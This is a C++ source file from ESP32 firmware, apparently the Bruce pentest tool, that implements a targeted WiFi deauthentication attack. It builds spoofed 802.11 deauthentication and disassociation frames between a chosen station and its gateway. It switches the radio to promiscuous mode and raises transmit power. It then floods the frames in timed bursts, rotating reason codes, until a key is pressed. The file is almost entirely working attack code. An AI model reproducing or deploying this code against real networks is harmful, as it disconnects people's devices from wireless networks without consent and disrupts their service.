#include "clients.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "scan_hosts.h"
#include "wifi_atks.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h>
#include <sstream>

// Função para obter o MAC do gateway (ORIGINAL - DON'T CHANGE)
void getGatewayMAC(uint8_t gatewayMAC[6]) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        memcpy(gatewayMAC, ap_info.bssid, 6);
        Serial.print("Gateway MAC: ");
        Serial.println(macToString(gatewayMAC));
    } else {
        Serial.println("Erro ao obter informações do AP.");
    }
}

// Helper functions added for fix
bool isMACZero(const uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0x00) return false;
    }
    return true;
}

bool macCompare(const uint8_t* mac1, const uint8_t* mac2) {
    for (int i = 0; i < 6; i++) {
        if (mac1[i] != mac2[i]) return false;
    }
    return true;
}

// Function to get correct AP channel
int getAPChannel(const uint8_t* target_bssid) {
    int found_channel = 0;
    
    for (int i = 0; i < scannedAPs; i++) {
        if (macCompare(APs[i].bssid, target_bssid)) {
            found_channel = APs[i].channel;
            break;
        }
    }
    
    if (found_channel == 0) {
        found_channel = WiFi.channel();
        if (found_channel == 0) found_channel = 1;
    }
    
    return found_channel;
}

// ============================================
// SIMPLE MONITOR MODE SETUP (OPTIONAL)
// ============================================

bool tryMonitorMode(uint8_t channel) {
    Serial.printf("[DEAUTH] Trying monitor mode on CH%d\n", channel);

    // Save current state
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);

    // Stop WiFi briefly
    esp_wifi_stop();
    delay(5);

    // Reinitialize
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    // Set to STA mode (required for monitor-like behavior)
    esp_wifi_set_mode(WIFI_MODE_STA);

    // Enable promiscuous mode (closest we can get to monitor)
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    // Set channel
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("[DEAUTH] Failed to set channel: %d\n", err);

        // Restore original state
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_mode(current_mode);
        esp_wifi_start();
        return false;
    }

    // Slight power increase for better range
    esp_wifi_set_max_tx_power(78);

    Serial.printf("[DEAUTH] Using enhanced mode on CH%d\n", channel);
    return true;
}

// ============================================
// OPTIMIZED FRAME BUILDING (FIXED VERSION)
// ============================================

void buildOptimizedDeauthFrame(uint8_t* frame, 
                              const uint8_t* dest,
                              const uint8_t* src,
                              const uint8_t* bssid,
                              uint8_t reason = 0x07,
                              bool is_disassoc = false) {
    // Frame control - fixed type values
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;

    // Duration - corrected to standard 311 microseconds
    frame[2] = 0x3A;
    frame[3] = 0x01;

    // MAC addresses
    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);

    // Sequence control - proper incrementing
    static uint16_t seq = 0;
    seq = (seq + 1) & 0xFFF;
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4) | 0x00;

    // Reason code
    frame[24] = reason;
    frame[25] = 0x00;
}

// ============================================
// ENHANCED STATION DEAUTH (MAIN FUNCTION - FIXED)
// ============================================

void stationDeauth(Host host) {
    uint8_t targetMAC[6];
    uint8_t gatewayMAC[6];
    uint8_t victimIP[4];

    // Copy IP address
    for (int i = 0; i < 4; i++) victimIP[i] = host.ip[i];

    // Convert target MAC
    if (!stringToMAC(host.mac.c_str(), targetMAC)) {
        displayError("Invalid MAC address", true);
        return;
    }

    // Get gateway MAC
    getGatewayMAC(gatewayMAC);
    
    // Check if we got a valid gateway MAC
    if (isMACZero(gatewayMAC)) {
        displayError("Could not get gateway MAC", true);
        return;
    }

    // Get the correct channel for the target AP
    int channel = getAPChannel(gatewayMAC);

    // Try enhanced mode first
    bool enhanced_mode = tryMonitorMode(channel);

    if (!enhanced_mode) {
        // Fallback to Bruce's original AP mode
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);

        if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
            Serial.println("Fail Starting AP Mode");
            displayError("Fail starting Deauth", true);
            return;
        }
    }

    // Prepare frames
    uint8_t deauth_ap_to_sta[26];      // AP -> Station deauth
    uint8_t disassoc_ap_to_sta[26];    // AP -> Station disassociate
    uint8_t deauth_sta_to_ap[26];      // Station -> AP deauth (spoofed)
    uint8_t disassoc_sta_to_ap[26];    // Station -> AP disassociate (spoofed)

    // Build frames with corrected addressing:
    // AP -> Station frames
    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, true);
    // Station -> AP frames
    buildOptimizedDeauthFrame(deauth_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, true);

    // Bruce's original display code (keep same structure)
    drawMainBorderWithTitle("Station Deauth");
    tft.setTextSize(FP);
    padprintln("Trying to deauth one target.");
    padprintln("Tgt:" + host.mac);
    padprintln("Tgt: " + ipToString(victimIP));
    padprintln("GTW:" + macToString(gatewayMAC));
    padprintln("CH:" + String(channel));
    padprintln("Mode:" + String(enhanced_mode ? "Enhanced" : "AP"));
    padprintln("");
    padprintln("Press Any key to STOP.");

    long tmp = millis();
    int cont = 0;
    int total_frames = 0;

    // Reason codes to rotate through
    uint8_t reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
    uint8_t current_reason = 0;

    while (!check(AnyKeyPress)) {
        // Update reason code every 20 frames
        if (cont % 20 == 0) {
            current_reason = (current_reason + 1) % 5;
            deauth_ap_to_sta[24] = reason_codes[current_reason];
            disassoc_ap_to_sta[24] = reason_codes[current_reason];
            deauth_sta_to_ap[24] = reason_codes[current_reason];
            disassoc_sta_to_ap[24] = reason_codes[current_reason];
        }

        if (enhanced_mode) {
            // Enhanced mode: Use raw frame transmission
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_ap_to_sta, 26, false);
            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_ap_to_sta, 26, false);
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_sta_to_ap, 26, false);
            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_sta_to_ap, 26, false);
        } else {
            // AP mode: Use Bruce's original send_raw_frame
            send_raw_frame(deauth_ap_to_sta, 26);
            send_raw_frame(disassoc_ap_to_sta, 26);
            send_raw_frame(deauth_sta_to_ap, 26);
            send_raw_frame(disassoc_sta_to_ap, 26);
        }

        cont += 4;
        total_frames += 4;

        // Optimized timing: burst then pause
        if (cont % 16 == 0) {
            delay(35); // Pause between bursts
        } else {
            delay(2);  // Fast burst
        }

        // Update FPS display every second
        if (millis() - tmp > 1000) {
            int fps = cont;
            cont = 0;
            tmp = millis();

            // Update FPS counter (more efficient)
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
        }
    }

    // Cleanup
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }

    wifiDisconnect();
    WiFi.mode(WIFI_STA);

    // Show summary
    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    delay(1000);
}
